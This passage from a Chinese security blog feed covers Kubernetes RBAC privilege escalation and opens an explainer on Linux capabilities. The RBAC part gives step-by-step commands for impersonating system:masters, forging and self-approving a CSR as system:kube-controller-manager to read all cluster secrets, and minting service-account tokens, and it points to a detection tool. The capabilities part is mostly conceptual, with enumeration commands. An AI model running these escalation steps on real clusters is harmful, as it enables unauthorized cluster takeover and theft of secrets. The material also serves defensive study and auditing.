class="string">&quot;impersonate&quot;</span>]</span><br></pre></td></tr></table></figure><p>对于<code>Impersonate-Extra-scopes</code>的设置也是需要相应的ClusterRole</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">scopes-impersonator</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="comment"># Can set &quot;Impersonate-Extra-scopes&quot; header.</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;authentication.k8s.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;userextras/scopes&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;impersonate&quot;</span>]</span><br></pre></td></tr></table></figure><p>通过kubectl，user-to-impersonate可以随便填写，group-to-impersonate填写<code>system:masters</code>可以获得集群权限<br><img src="https://s2.loli.net/2023/01/16/uJnprVUPRjdczkx.png" alt="image.png"></p><h1 id="CSR和签发证书"><a href="#CSR和签发证书" class="headerlink" title="CSR和签发证书"></a>CSR和签发证书</h1><p>在访问网站时，如果该网站的证书没有被受信任的证书颁发机构签名，那么将收到对于该网站不信任的告警，kubernetes中的客户端使用证书的身份验证，比如api-server和kubelet之前的通信等。</p><p>CSR(CertificateSigningRequest)就是用来向指定的签名者申请证书签名，而CSR API是一种无需访问证书颁发机构就可签名的方式，CSR API允许通过具有相关RBAC权限的用户将CSR发送到kubernetes中批准。</p><p>Kubernetes提供了内置的签名者，每一个签名者有一个signerName，其中<code>kubernetes.io/kube-apiserver-client-kubelet</code>签名的证书被 kube-apiserver 视为客户证书用来内部组件使用，而<code>kubernetes.io/kube-apiserver-client</code>签名的证书可以向 Kubernetes API 服务器进行身份验证。</p><p>当RBAC授予用户对于create CSR 的权限和 <code>update certificatesigningrequests/approval</code> 的权限， 其中签名者是 <code>kubernetes.io/kube-apiserver-client</code>的情况下可以利用提权。</p><p>这是一个已经拥有相关RBAC权限的yaml，具有创建、检索、批准、签名CSR的权限</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">csr</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;certificates.k8s.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;certificatesigningrequests&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]</span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;certificates.k8s.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;certificatesigningrequests/approval&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;update&quot;</span>]</span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;certificates.k8s.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;certificatesigningrequests/status&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;update&quot;</span>]</span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;certificates.k8s.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;signers&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;approve&quot;</span>, <span class="string">&quot;sign&quot;</span>]</span><br></pre></td></tr></table></figure><p>添加到<code>system:masters</code> 组的用户会默认绑定到cluster-admin角色，该组内的成员具有集群的完全控制权限，首先尝试创建一个该组的证书进行利用直接获取集群管理员权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成PKI私钥和CSR，设置CSR的CN和O，CN表示用户名，O表示该用户的组</span></span><br><span class="line">openssl genrsa -out csr-test.key 2048</span><br><span class="line">openssl req -new -key csr-test.key -out csr-test.csr -subj <span class="string">&quot;/O=system:masters/CN=csr-test&quot;</span></span><br></pre></td></tr></table></figure><p>创建CSR并通过kubectl提交到集群</p><ul><li>usage: 必须是<code>client auth</code></li><li>expirationSeconds: 表示时间864000为10天，3600是一小时</li><li>request: 是CSR文件的base64编码，可以通过<code>cat csr-test.csr | base64 | tr -d &quot;\n&quot;</code>获取该值<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f - &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">apiVersion: certificates.k8s.io/v1</span></span><br><span class="line"><span class="string">kind: CertificateSigningRequest</span></span><br><span class="line"><span class="string">metadata:</span></span><br><span class="line"><span class="string">  name: csr-test</span></span><br><span class="line"><span class="string">spec:</span></span><br><span class="line"><span class="string">  request: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURSBSRVFVRVNULS0tLS0KTUlJQ2NUQ0NBVmtDQVFBd0xERVhNQlVHQTFVRUNnd09jM2x6ZEdWdE9tMWhjM1JsY25NeEVUQVBCZ05WQkFNTQpDR056Y2kxMFpYTjBNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTJnRGU4bTNICmlGSEowSDNoeksyVlJtUkJkaHB5SjQ5SXNqNHJmMmV1SGVSVlk5VmpYU1d2UlRHQTBHTGg2QmlMeTBYQjZiSmsKUFgrSE85THVNZDVQK1VhMEhiRUF0eDBLQ00wclhZYWRGVDk1UU5jY2s3UWRBTzE1dXZNU042OTlaVmxIYnVqTApuYTBkdFVsaWhEdWtqM0NxaFpHeHlBOENMSG12SUN1YlYzaUZzb0FmT1FKTHVrMVc5SXJkdXI2MW1vZjc2UUYzCnlESFMyMSs2K3ZNZG5PMG8vK3JxOFE5SFdicUs0SGJUOWpSTzdOb2p3OFkzK3RRVGNITE9DZnZnZ0I2b3RsMWkKN1R2KzhESS9QNFF0TDNZL1RyODJRSEovNHpVWkRkelNvL3pTSDRyaS9xclhBMDQvQzFyMVphZk9nSVMvRHk2VwpPMnhGZlRZRndRbXZiUUlEQVFBQm9BQXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBTmZzQzdVTDV4SHZnYkRrCmc2UG9pODVmWS9SNmhIQmdkS1NIODNzdmZIcnR0dEQzRG9TVWp0S2hrZ3o5bU9yQmlkdWgza0pvd2M4Q0NJVE8KS0MzV1V6RzJ0ekdtTlVFeFFpUmUveTdTQUZEaHRtUUF4WjJiS3huN3NkNTR3MG5JRTNlMXpYRXh2bC9YcXB4egpoQ0M2RzkvcVNYb3VMQzZKTlNobFVMVFU3SjNQZmtKeHRFVHhhTXBYL1dwclVoR0hEUW55TTFwMUtGMko5UFEvCkQ2cFRnMWJQbjVHRmpXdEZuUkU5TnVVbWhCTVRvR0xESWh3cTdrdnZadHRGSFNmTFJudmlJUnRKUlRQb2llbnMKbDZPcVBhazhDd2pVL1MwWEVON0wrbEl1Sjl0WUdUbmtJdWxvSUQ0R1NEZTRiWmt1ZWVYUWhRaW1LdmxFdUdaawo1SHA0QVBzPQotLS0tLUVORCBDRVJUSUZJQ0FURSBSRVFVRVNULS0tLS0K</span></span><br><span class="line"><span class="string">  signerName: kubernetes.io/kube-apiserver-client</span></span><br><span class="line"><span class="string">  expirationSeconds: 864000</span></span><br><span class="line"><span class="string">  usages:</span></span><br><span class="line"><span class="string">  - client auth</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/01/16/r4qaNjpv5L3fZiW.png" alt="image.png"><br>创建失败，查看资料存在一个准入控制器<a href="https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#certificatesubjectrestriction">CertificateSubjectRestriction</a>发现如果是<code>kubernetes.io/kube-apiserver-client</code>请求组为<code>system:masters</code>会被拒绝。<br>对于不能一步到位表示遗憾，还可以查看有没有其他组存在默认绑定ClusterRole的，比如<code>system:nodes</code>可以直接和kubelet通信对所有的secret和pod进行写访问等。<br>也可查看集群中已经定义好的ClusterRole有没有其他存在默认绑定的，看看那些权限高一点可以拿来用的，然后创建与之匹配的证书，默认的比如有<code>system:kube-controller-manager</code>可以查看secrets，也可以利用<code>system:kube-proxy</code> 访问每个node有一个pod，并可以逃逸的情况直接获得集群所有宿主机权限等等。<br>下图为<code>system:kube-controller-manager</code>权限可以对secrets操作<br><img src="https://s2.loli.net/2023/01/16/ARs2U4NMjCLJY16.png" alt="image.png"><br>继续之前的步骤只添加角色为改为<code>-subj &quot;/CN=system:kube-controller-manager&quot;</code>，创建CSR并发送<br><img src="https://s2.loli.net/2023/01/16/4HMlPtG86NdYSVg.png" alt="image.png"><br>创建成功，可以查看CSR并批准<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取CSR列表</span></span><br><span class="line">kubectl get csr</span><br><span class="line"><span class="comment"># 批准CSR</span></span><br><span class="line">kubectl certificate approve csr-test</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/01/16/CyqBHmErvjGdoFO.png" alt="image.png"><br>然后查看证书，从CSR导出颁发的证书<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看CSR</span></span><br><span class="line">kubectl get csr csr-test -oyaml</span><br><span class="line"><span class="comment"># 证书的内容使用 base64 编码，存放在字段status.certificate</span></span><br><span class="line"><span class="comment"># 导出颁发的证书</span></span><br><span class="line">kubectl get csr csr-test -o jsonpath=<span class="string">&#x27;&#123;.status.certificate&#125;&#x27;</span>| <span class="built_in">base64</span> -d &gt; csr-test.crt</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/01/16/ZfNe193rHC5tIiO.png" alt="image.png"><br>由于我们用户设置的是<code>system:kube-controller-manager</code>，会默认绑定到ClusterRole，这时就不需要再对新创建的<code>csr-test</code>进行创建角色和角色绑定的操作了，从而避免了对当前用户权限需要有对RBAC的操作，如果没有相关可以利用的verb进一步提权到头来还是白费，所以这边直接使用集群默认并绑定好的。</li></ul><p>将该用户添加到<code>kubeconfig</code>文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加新的凭据</span></span><br><span class="line">kubectl config set-credentials csr-test --client-key=csr-test.key --client-certificate=csr-test.crt --embed-certs=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加上下文</span></span><br><span class="line">kubectl config set-context csr-test --cluster=kubernetes --user=csr-test</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/16/kROfTyHcK2mEIqb.png" alt="image.png"><br>把上下文切换到<code>csr-test</code>测试下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl config use-context csr-test</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/16/4iolN8kF6IOmCwT.png" alt="image.png"><br>提权成功整个集群的secrets都可以查看，进一步提权到集群管理员可以获取<code>clusterrole-aggregation-controller</code>的sa的token，也可以一开始的用户设置为<code>system:kube-proxy</code>直接获取整个集群宿主机权限等多种组合利用方式。</p><p>下表为一些常见的默认ClusterRole存在默认ClusterRoleBinding</p><table><thead><tr><th>默认ClusterRole</th><th>默认ClusterRoleBinding</th><th>说明</th></tr></thead><tbody><tr><td>system:kube-scheduler</td><td>system:kube-scheduler(user)</td><td>允许访问 kube-scheduler 组件所需要的资源</td></tr><tr><td>system:kube-controller-manager</td><td>system:kube-controller-manager(user)</td><td>允许访问 kube-controller-manager 组件所需要的资源。</td></tr><tr><td>system:node-proxier</td><td>system:kube-proxy(user)</td><td>允许对 kube-proxy 组件所需要资源的访问。</td></tr><tr><td>system:node</td><td>system:nodes (group)</td><td>允许对 kubelet 组件所需要的资源的访问</td></tr><tr><td>system:basic-user</td><td></td><td></td></tr><tr><td>system:public-info-viewer</td><td></td><td></td></tr><tr><td>system:discovery</td><td>system:authenticated (group)</td><td>允许用户以只读的方式去访问他们自己的基本信息，允许以只读方式访问 API 发现端点，允许对集群的非敏感信息进行只读访问</td></tr><tr><td>system:public-info-viewer</td><td>system:unauthenticated (group)</td><td>允许对集群的非敏感信息进行只读访问</td></tr><tr><td>system:monitoring</td><td>system:monitoring (group)</td><td>允许对控制平面监控端点的读取访问</td></tr><tr><td>cluster-admin</td><td>system:masters (group)</td><td>允许超级用户在平台上的任何资源上执行所有操作。</td></tr></tbody></table><h1 id="令牌请求"><a href="#令牌请求" class="headerlink" title="令牌请求"></a>令牌请求</h1><p>当权限具有对<code>serviceaccounts/token</code>的 create 权限的用户可以创建 <code>TokenRequest</code> 对目标sa请求创建一个token。<br>当前用户具有如下权限对sa的获取、例举以及对sa创建token</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">token-create</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;serviceaccounts&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;serviceaccounts/token&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>]</span><br></pre></td></tr></table></figure><p>目前该用户可以列举sa，但是不能查看secrets<br><img src="https://s2.loli.net/2023/01/16/Q4K8tel7xGIiTZy.png" alt="image.png"><br>请求创建<code>token-create</code>的token，可以通过kubectl也可以通过REST API<br><img src="https://s2.loli.net/2023/01/16/1j7oSOhqJKaVtyw.png" alt="image.png"><br>拿到token尝试利用，利用使用curl或者kubectl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl config set-credentials token-create --token=&lt;token&gt;</span><br><span class="line">kubectl config set-context token-create --cluster=kubernetes --user=token-create</span><br><span class="line">kubectl config use-context token-create</span><br></pre></td></tr></table></figure><p>通过命令修改<code>kubeconfig</code>添加用户并设置上下文，切换到创建的用户成功列举<code>secrets</code><br><img src="https://s2.loli.net/2023/01/16/E3vBTg8HfsMjGke.png" alt="image.png"></p><h1 id="RBAC检测工具"><a href="#RBAC检测工具" class="headerlink" title="RBAC检测工具"></a>RBAC检测工具</h1><p>对于本文中提到的内容，由于目前Github中并没有看到对于RBAC配置利用进行检测的工具，虽对此编写了一款小工具方便有需要的可以检测，具体工具参考<a href="https://github.com/ZhuriLab/rbacr">rbacr</a>，使用中有问题欢迎提交Issues或者pr。<br><img src="https://s2.loli.net/2023/01/16/PZWh2ef9aJIGLub.png" alt="image.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://kubernetes.io/docs/reference/access-authn-authz/authentication/">Authenticating</a></li><li><a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">Using RBAC Authorization</a></li><li><a href="https://www.cncf.io/wp-content/uploads/2020/08/2020_04_Introduction-to-Kubernetes-RBAC.pdf">Kubernetes RBAC 101</a></li><li><a href="https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#certificatesubjectrestrictions">Admission Controllers Reference</a></li><li><a href="https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/">Kubernetes API</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> k8s </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> 云原生 </tag>
            
            <tag> API访问控制 </tag>
            
            <tag> RBAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Capabilities利用总结</title>
      <link href="/posts/68261434/"/>
      <url>/posts/68261434/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux对于权限的管理，系统权限只有root才有，对于普通用户只有一些有限的权限；而对于普通用户如果想进行一些权限以外的操作，之前主要有两种方法：一是通过sudo提权；二是通过<a href="https://en.wikipedia.org/wiki/Setuid">SUID</a>，让普通用户对设有SUID的文件具有执行权限，当用户执行此文件时，会用文件的拥有者的权限执行，比如常用的命令<code>passwd</code>，修改用户的密码是需要root权限的，但是普通用户却可以使用，这是因为<code>/usr/bin/passwd</code>被设置了SUID，该文件的拥有者是root，所以普通用户可以使用并执行。<br>但是SUID却带来了安全隐患，因为本身需要一部分特权，但是却拥有了root的全部权限，所以为了对root权限进行更加细粒度的控制，Linux 引入了 <code>capabilities</code> 机制对 root 权限进行细粒度的控制，实现按需授权，从而减小系统的安全攻击面。本文主要总结 Capabilites 机制的基本概念和利用。</p><h1 id="Linux-Capabilities-是什么？"><a href="#Linux-Capabilities-是什么？" class="headerlink" title="Linux Capabilities 是什么？"></a>Linux Capabilities 是什么？</h1><p>从内核 2.2 开始，Linux 将传统上与超级用户 root 关联的特权划分为不同的单元，称为<code>Capabilites</code>。Capabilites 作为线程(Linux 并不真正区分进程和线程)的属性存在，每个单元可以独立启用和禁用。如此一来，权限检查的过程就变成了：在执行特权操作时，如果进程的有效身份不是 root，就去检查是否具有该特权操作所对应的 <code>capabilites</code>，并以此决定是否可以进行该特权操作。比如要向进程发送信号(kill())，就得具有 capability <code>CAP_KILL</code>；如果设置系统时间，就得具有 capability <code>CAP_SYS_TIME</code>。</p><p>Linux中的capability是可以分配给进程、二进制文件、服务和用户等的特殊属性，它们可以允许它们拥有通常保留给root级行动的特定权限，Capabilities 可以在进程执行时赋予，也可以直接从父进程继承。所以理论上如果给 nginx 可执行文件赋予了 <code>CAP_NET_BIND_SERVICE</code>，那么它就能以普通用户运行并监听在 80 端口上。</p><h1 id="不同的Capabilities"><a href="#不同的Capabilities" class="headerlink" title="不同的Capabilities"></a>不同的Capabilities</h1><h2 id="线程-Capabilities"><a href="#线程-Capabilities" class="headerlink" title="线程 Capabilities"></a>线程 Capabilities</h2><p>每一个线程，具有5个<code>capabilities</code>集合，每一个集合使用 64 位掩码来表示，显示为 16 进制格式。<br>五种 capabilities 集合类型，分别是：</p><ul><li>CapInh: Inheritable capabilities</li><li>CapPrm: Permitted capabilities</li><li>CapEff: Effective capabilities</li><li>CapBnd: Bounding set</li><li>CapAmb: Ambient capabilities set</li></ul><p>每个集合中都包含零个或多个 capabilities。这5个集合的具体含义如下：</p><ul><li><code>CapEff(Effective)</code>: Effective代表进程目前正在使用的所有Capabilities（这是内核用于权限检查的实际capabilities集）。对于文件capabilities来说，Effective实际上是一个单一的位，表示在运行二进制文件时，<code>Permitted</code>的Capabilities是否会被移到<code>Effective</code>集。这使得那些没有capabilities的二进制文件有可能在不发出特殊系统调用的情况下使用文件Capabilities。</li><li><code>CapPrm(Permitted)</code>: 这是一个capabilities的超集，线程可以将其添加到线程允许的或线程可继承的集合中。线程可以使用<code>capset()</code>系统调用来管理Capabilities。它可以从任何集合中删除任何Capabilities，但只能向其线程<code>Effective</code>和<code>Inheritable</code>添加线程允许集合中的Capabilities。因此，它不能将任何Capabilities添加到其线程允许的集合中，除非它的线程有效集合中有<code>CAP_SETPCAP</code>。</li><li><code>CapInh(Inheritable)</code>: 使用<code>Inheritable</code>集可以指定允许从父进程继承的所有Capabilities。这可以防止一个进程接收它不需要的任何Capabilities。这里需要说明一下，包含在该集合中的 capabilities 并不会自动继承给新的可执行文件，即不会添加到新线程的 <code>Effective</code> 集合中，它只会影响新线程的 <code>Permitted</code> 集合。</li><li><code>CapBnd(Bounding)</code>: <code>Bounding</code> 集合是 <code>Inheritable</code> 集合的超集，可以限制一个进程可能收到的Capabilities。在<code>Inheritable</code>和<code>Permitted</code>集中，只有存在于<code>Bounding</code>集中的Capabilities才被允许。</li><li><code>CapAmb(Ambient)</code>: Linux 4.3 内核新增了一个 capabilities 集合叫 <code>Ambient</code> ，用来弥补 <code>Inheritable</code> 的不足。<code>Ambient</code>集适用于所有没有文件Capabilities的非SUID二进制文件。它在<code>execve()</code>时保留了Capabilities。然而，并不是所有在Ambient集的Capabilities都会被保留，因为它们会被丢弃，以防它们不在<code>Inheritable</code>或<code>Permitted</code>集中出现。这个集合在 execve 调用时被保留。Ambient 的好处显而易见，举个例子，如果你将<code> CAP_NET_ADMIN</code> 添加到当前进程的 Ambient 集合中，它便可以通过 <code>fork()</code> 和 <code>execve()</code> 调用 <code>shell</code> 脚本来执行网络管理任务，因为 <code>CAP_NET_ADMIN</code> 会自动继承下去。</li></ul><p>要查看某个特定进程的capabilities，可以使用<code>/proc</code>目录下的状态文件。</p><blockquote><p>对于所有正在运行的进程，capabilities信息是按线程维护的，对于文件系统中的二进制文件，它被存储在扩展属性中。</p></blockquote><p>可以在<code>/usr/include/linux/capability.h</code>中找到定义的Capabilities。<br>可以在<code>cat /proc/self/status</code>或<code>capsh --print</code>中找到当前进程的capabilities，在<code>/proc/&lt;pid&gt;/status</code>中找到其他用户的capabilities。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/&lt;pid&gt;/status | grep Cap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前进程的capabilities</span></span><br><span class="line"><span class="built_in">cat</span> /proc/$$/status | grep Cap</span><br></pre></td></tr></table></figure><p>这是一个典型的<code>root</code>进程所拥有的capabilities<br><img src="https://s2.loli.net/2023/01/09/k5NSa6Cm9WKhFVp.png" alt="image.png"></p><ul><li><code>capsh</code></li></ul><p>但是这种方式获得的信息无法阅读，我们需要使用 <code>capsh</code> 命令把它们转义为可读的格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">capsh --decode=0000003fffffffff</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/09/sZ1fRl8Btkx9CDq.png" alt="image.png"></p><p>capsh也可以直接查看当前capabilities<code>capsh --print</code><br><img src="https://s2.loli.net/2023/01/09/48zTDv9RPadU3sX.png" alt="image.png"></p><ul><li><code>getpcaps</code></li></ul><p>getpcaps工具使用<code>capget()</code>系统调用来查询某个特定线程的可用Capabilities。这个系统调用只需要提供PID就可以获得相关信息。<br>查看进程的capabilities还可以通过<code>getpcaps</code>，然后是其进程ID（PID），也可以提供一个进程ID的列表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getpcaps &lt;pid&gt;</span><br></pre></td></tr></table></figure><p>测试一下<code>tcpdump</code>的Capabilities，在赋予二进制文件足够的Capabilities（<code>cap_net_admin</code>和<code>cap_net_raw</code>）来抓包后（ping在395120进程中运行）。<br>可以看到我们给tcpdump设置的capabilities是一致的，非root用户也可以嗅探网络。<br><img src="https://s2.loli.net/2023/01/09/rMLEyQBTWhzcqad.png" alt="image.png"></p><h2 id="文件-Capabilities"><a href="#文件-Capabilities" class="headerlink" title="文件 Capabilities"></a>文件 Capabilities</h2><p>文件的 capabilities 被保存在文件的扩展属性中。如果想修改这些属性，需要具有 <code>CAP_SETFCAP</code> 的 capability。文件与线程的 capabilities 共同决定了通过 <code>execve()</code> 运行该文件后的线程的 capabilities。</p><p>文件的 capabilities 功能，需要文件系统的支持。如果文件系统使用了 <code>nouuid</code> 选项进行挂载，那么文件的 capabilities 将会被忽略。</p><p>在上面的示例中我们通过 <code>setcap</code> 命令修改了程序文件 <code>/usr/sbin/tcpdump</code> 的 capabilities。在可执行文件的属性中有三个集合来保存三类 capabilities，它们分别是：</p><ul><li><code>Permitted</code>：在进程执行时，Permitted 集合中的 capabilites 自动被加入到进程的 Permitted 集合中。</li><li><code>Inheritable</code>：Inheritable 集合中的 capabilites 会与进程的 Inheritable 集合执行与操作，以确定进程在执行 execve 函数后哪些 capabilites 被继承。</li><li><code>Effective</code>：Effective 只是一个 bit。如果设置为开启，那么在执行 execve 函数后，Permitted 集合中新增的 capabilities 会自动出现在进程的 Effective 集合中。</li></ul><p>二进制文件可以有在执行时可以使用的Capabilities。例如，有<code>cap_net_raw</code>capabilites的ping二进制文件，以及设置过的tcpdump。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~<span class="comment"># getcap /usr/bin/ping</span></span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">root@k8s-master:~<span class="comment"># getcap /usr/sbin/tcpdump</span></span><br><span class="line">/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip</span><br></pre></td></tr></table></figure><p>命令中的 ep 分别表示 Effective 和 Permitted 集合，+ 号表示把指定的 capabilities 添加到这些集合中，- 号表示从集合中移除(对于 Effective 来说是设置或者清除位)。</p><p>下面的命令可以用来查找已经有capabilities的二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ul><li><strong>通过capsh删除Capabilities</strong></li></ul><p>如果我们停止<code>tcpdump</code>的<code>CAP_NET_RAW</code>那么无法再使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">capsh --drop=cap_net_raw --<span class="built_in">print</span> -- -c <span class="string">&quot;tcpdump&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/09/vw6fsNCVl1jTkIX.png" alt="image.png"></p><ul><li><strong>移除Capabilities</strong></li></ul><p>可以用以下方法移除一个二进制文件的Capabilities</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setcap</span> -r &lt;path&gt;</span><br></pre></td></tr></table></figure><h2 id="用户-Capabilities"><a href="#用户-Capabilities" class="headerlink" title="用户 Capabilities"></a>用户 Capabilities</h2><p>用户也可以分配Capabilities，这意味着，由用户执行的每一个进程都能使用用户的capabilities。</p><p>分配给用户的Capabilities存储在<code>/etc/security/capability.conf</code>配置文件中<br><img src="https://s2.loli.net/2023/01/09/kiJfLnRG4zhdlV3.png" alt="image.png"></p><h2 id="环境-Capabilities"><a href="#环境-Capabilities" class="headerlink" title="环境 Capabilities"></a>环境 Capabilities</h2><p>可以通过<code>capsh --print</code>查看当前环境的Capabilities<br>编译<a href="https://s3hh.wordpress.com/2015/07/25/ambient-capabilities/">ambient.c</a>程序，就有可能在一个提供 Capabilities 的环境中产生一个<code>bash shell</code><br>在运行编译后的文件后获得的<code>bash</code>中可以发现有了新的Capabilities<br><img src="https://s2.loli.net/2023/01/09/DW4qb7e9oUuC8gi.png" 